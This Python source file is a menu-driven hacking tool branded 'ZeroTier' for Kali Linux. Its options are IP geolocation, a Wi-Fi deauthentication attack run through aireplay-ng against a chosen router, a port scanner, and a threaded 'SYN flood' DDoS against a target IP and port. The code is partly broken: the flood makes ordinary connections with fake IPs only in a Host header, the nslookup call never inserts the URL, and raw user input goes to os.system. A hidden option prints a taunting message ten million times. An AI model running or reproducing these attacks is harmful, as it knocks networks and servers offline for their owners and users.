import os
try:
    import requests
except ImportError:
    os.system('pip install requests')
import time
from concurrent.futures import ThreadPoolExecutor
import socket
from scapy.all import ARP, Ether, sniff
import socket
import threading
import time
import random

CEND      = '\33[0m'
CBOLD     = '\33[1m'
CITALIC   = '\33[3m'
CURL      = '\33[4m'
CBLINK    = '\33[5m'
CBLINK2   = '\33[6m'
CSELECTED = '\33[7m'

CBLACK  = '\33[30m'
CRED    = '\33[31m'
CGREEN  = '\33[32m'
CYELLOW = '\33[33m'
CBLUE   = '\33[34m'
CVIOLET = '\33[35m'
CBEIGE  = '\33[36m'
CWHITE  = '\33[37m'

CBLACKBG  = '\33[40m'
CREDBG    = '\33[41m'
CGREENBG  = '\33[42m'
CYELLOWBG = '\33[43m'
CBLUEBG   = '\33[44m'
CVIOLETBG = '\33[45m'
CBEIGEBG  = '\33[46m'
CWHITEBG  = '\33[47m'

CGREY    = '\33[90m'
CRED2    = '\33[91m'
CGREEN2  = '\33[92m'
CYELLOW2 = '\33[93m'
CBLUE2   = '\33[94m'
CVIOLET2 = '\33[95m'
CBEIGE2  = '\33[96m'
CWHITE2  = '\33[97m'

CGREYBG    = '\33[100m'
CREDBG2    = '\33[101m'
CGREENBG2  = '\33[102m'
CYELLOWBG2 = '\33[103m'
CBLUEBG2   = '\33[104m'
CVIOLETBG2 = '\33[105m'
CBEIGEBG2  = '\33[106m'
CWHITEBG2  = '\33[107m'                                    



def logo():
    print("")
    print(CGREEN+"▒███████▒▓█████  ██▀███   ▒█████  ▄▄▄█████▓ ██▓▓█████  ██▀███  ")
    print("▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██▒▓█   ▀ ▓██ ▒ ██▒")
    print("░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██▒▒███   ▓██ ░▄█ ▒")
    print("  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ░██░▒▓█  ▄ ▒██▀▀█▄  ")
    print("▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░██░░▒████▒░██▓ ▒██▒")
    print("░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░  For Kali Linux")
    print("░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░     ░     ▒ ░ ░ ░  ░  ░▒ ░ ▒░  By starykapec_ (ZeroTier TEAM)")
    print("░     ░        ░        ░             ░       ░         ░        v1.0        "+CEND)
    print(CYELLOW+CBOLD+"+=============================================================+"+CEND)





if not 'SUDO_UID' in os.environ.keys():
    logo()
    print("")
    print("Run "+CRED+CBOLD+"ZERO TIER "+CEND+"in sudo su")
    exit()                                         

def menuback():
    input(CYELLOW+CBOLD+"Click enter to go back to menu"+CEND)
    time.sleep(0)
    main()

def enddos():
    print("")

def main():
    os.system("clear")
    logo()
    print("")
    print(CBOLD+CYELLOW+"[1] GeoLocate IP                "+CEND+CBOLD+"Locates a device by their IP              ")
    print(CBOLD+CYELLOW+"[2] Wifi Deauth attack          "+CEND+CBOLD+"Shutdowns network")
    print(CBOLD+CYELLOW+"[3] TCP Port Scanner            "+CEND+CBOLD+"Scans ports for server IP")
    print(CBOLD+CYELLOW+"[4] DDoS attack (SYN Flood)     "+CEND+CBOLD+"Attacks IP with Distributed Denial of Service")
    print(CBOLD+CYELLOW+"[5] Find IP Adress of website   "+CEND+CBOLD+"Finds IP Adress of website")
    print(CBOLD+CYELLOW+"[6] Exit                        "+CEND+CBOLD+"Exits menu")
    print(""+CEND)
    selectoption = int(input(CBLINK2+"> "+CEND))

    if selectoption == 1:
        os.system("clear")
        logo()
        print("")
        print("Type in the IP")
        curlip = input("> ")
        print("")
        curledipapi = requests.get(f"http://ipinfo.io/{curlip}").json()
        curledipapi2 = requests.get(f"http://ip-api.com/json/{curlip}").json()
        os.system("clear")
        logo()
        print("")
        try:
            print(CYELLOW+CBOLD+"IP: " + curledipapi['ip'])
        except:
            print(CYELLOW+CBOLD+"IP: Invalid"+CEND)
        try:
            print("Status: " + curledipapi2['status'])
        except:
            print(CYELLOW+CBOLD+"Status: failed"+CEND)
        try:
            print("Host Name: " + curledipapi['hostname'])
        except:
            print(CYELLOW+CBOLD+"Host Nam: Not Found"+CEND)
        try:
            print("City: " + curledipapi['city'])
        except:
            print(CYELLOW+CBOLD+"City: Not Found"+CEND)
        try:
            print("Region: " + curledipapi['region'])
        except:
            print(CYELLOW+CBOLD+"Region: Not Found"+CEND)
        try:
            print("Country: " + curledipapi2['country'])
        except:
            print(CYELLOW+CBOLD+"Country: Not Found"+CEND)
        try:
            print("Geo Localization: " + curledipapi['loc'])
        except:
            print(CYELLOW+CBOLD+"Geo Localization: Not Found"+CEND)
        try:
            print("Org: " + curledipapi['org'])
        except:
            print(CYELLOW+CBOLD+"Org: Not Found"+CEND)
        try:
            print("Postal Code: " + curledipapi['postal'])
        except:
            print(CYELLOW+CBOLD+"Postal Code: Not Found"+CEND)
        try:
            print("Time Zone: " + curledipapi['timezone']+CEND)
        except:
            print(CYELLOW+CBOLD+"Time Zone: Not Found"+CEND)
        print("")
        menuback()

    elif selectoption == 2:
        mon = "mon"
        os.system("clear")
        logo()
        print("")
        os.system("iwconfig")
        print("Choose "+CRED+"WIRELESS"+CEND+" interface")
        print("")
        interface2 = input("> ")
        os.system("clear")
        logo()
        print("")
        os.system("sudo airmon-ng start "+interface2)
        os.system("clear")
        logo()
        print("")
        os.system("sudo airodump-ng "+interface2+mon)
        print("Enter targeted router BSSID")
        BSSId = input("> ")
        os.system("clear")
        logo()
        print("")
        print("Attack is starting...")
        time.sleep(2)
        os.system("sudo aireplay-ng --deauth 0 -a "+BSSId+" "+interface2+mon)
        print(CBOLD+CRED+"Click Enter to stop the attack"+CEND)
        enddos()

    elif selectoption == 3:
        os.system("clear")
        logo()
        print("")
        # ========== CONFIGURATION ==========
        print("Enter IP you wanna scan")
        TARGET_IP = str(input("> "))
        print("Enter the end port (THE MOST IS 65535)")
        END_PORT = int(input("> "))
        print("")
        START_PORT = 1
        TIMEOUT = 0.5
        # ===================================

        def scan():
            os.system("clear")
            logo()
            print("")

            print(CYELLOW+CBOLD+f"Scanning {TARGET_IP} (ports {START_PORT}-{END_PORT})...\n"+CEND)
            open_ports = []
            for port in range(START_PORT, END_PORT + 1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT)

                try:
                    if sock.connect_ex((TARGET_IP, port)) == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "unknown"
                        
                        print(f" Port {port}: OPEN ({service})")
                        open_ports.append(port)
                except:
                    pass
                finally:
                    sock.close()
            
            # Results summary
            print(f"\nFound {len(open_ports)} open ports")
            if open_ports:
                print("Open ports:", ", ".join(map(str, open_ports)))
                print("")
                menuback()
            

        if __name__ == "__main__":
            scan()


    elif selectoption == 4:
        os.system("clear")
        logo()
        print("")
        os.system("clear")
        logo()
        print("Enter target IP")
        TARGET_IP = input("> ")
        print("Enter target PORT")
        TARGET_PORT = int(input("> "))
        print("Enter target 3 ranges of IP")
        THREE_OF_FAKE = input("> ")
        FAKE_IPS = [THREE_OF_FAKE+"{}".format(i) for i in range(1, 255)]
        print("Enter Thread Count")  
        THREAD_COUNT = int(input("> "))
        print("Enter Attack Duration")
        ATTACK_DURATION = int(input("> "))
        os.system("clear")
        logo()
        print("")

        # Global flag to control the attack
        flooding = True

        def syn_flood():
            while flooding:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    source_ip = random.choice(FAKE_IPS)
                    s.connect((TARGET_IP, TARGET_PORT))
                    s.send(bytes("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(source_ip), 'utf-8'))
                    s.close()
                except:
                    pass

        print(f"Starting SYN flood on {TARGET_IP}:{TARGET_PORT}")
        for i in range(THREAD_COUNT):
            thread = threading.Thread(target=syn_flood)
            thread.daemon = True  
            thread.start()
            time.sleep(0.01)

        print(f"Attacking for {ATTACK_DURATION} seconds...")
        time.sleep(ATTACK_DURATION)
        flooding = False
        print("Attack stopped.")

    elif selectoption == 5:
        os.system("clear")
        logo()
        print("")
        print("Enter website url")
        weburl = input("> ")
        print(CYELLOW+CBOLD+"")
        os.system("nslookup {weburl}"+CEND)

    elif selectoption == 6:
        print("")
        print("Exiting...")
        time.sleep(1)
        os.system("clear")
        exit()

    elif selectoption == 213769:
        a = 6
        b = 7
        c = 67
        print(f"{a} + {b} = {c}")
        for i in range(10000000):
            print("Ten komputer jest niewykrywalny ty FBIjajska ździro essa monessa z wami frajerzy")
            print("siemanko tutaj multi")


    else:
        os.system("clear")
        logo()
        print("")
        print(CGREEN+CBOLD+"Chose a valid option!"+CEND)
        time.sleep(1.5)
        main()

main()
